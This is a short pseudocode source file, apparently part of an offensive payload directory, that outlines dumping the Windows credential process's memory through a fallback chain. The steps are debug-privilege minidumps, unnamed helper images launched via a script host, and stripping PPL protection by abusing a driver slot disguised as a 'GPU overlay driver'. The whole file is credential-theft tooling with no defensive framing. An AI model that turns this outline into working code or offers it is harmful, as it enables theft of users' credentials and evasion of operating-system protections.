# src/payload/secret_store_dump.pseudo
# Dump of the OS credential process. Fallback chain.

FUNCTION capture(out_path) -> bool:
    TRY native_minidump(out_path)        THEN RETURN true
    TRY helper_wdigest(out_path)         THEN RETURN true
    TRY helper_lsa(out_path)             THEN RETURN true
    TRY helper_guard_bypass(out_path)    THEN RETURN true
    TRY ppl_strip_then_native(out_path)  THEN RETURN true
    RETURN false

FUNCTION find_store_pid() -> pid | 0:
    process whose name is the OS credential process

FUNCTION native_minidump(out_path) -> bool:
    enable debug privilege on this token
    open the credential process with full access
    create out_path
    invoke the OS minidump API with a full-memory dump type
    # On current Windows the target is PPL. This path fails
    # unless PPL was already stripped.

FUNCTION helper_wdigest / helper_lsa / helper_guard_bypass:
    look under HELPER_DIR for optional helper images
    IF missing: skip
    launch via a script host
    # The public clone does not name those images.

FUNCTION ppl_strip_then_native(out_path):
    reuse driver_assist on the credential-process pid
    using the "GPU overlay driver" slot
    THEN native_minidump
    # That slot's control code, as sketched in the private
    # tree, is the wrong primitive for this job.
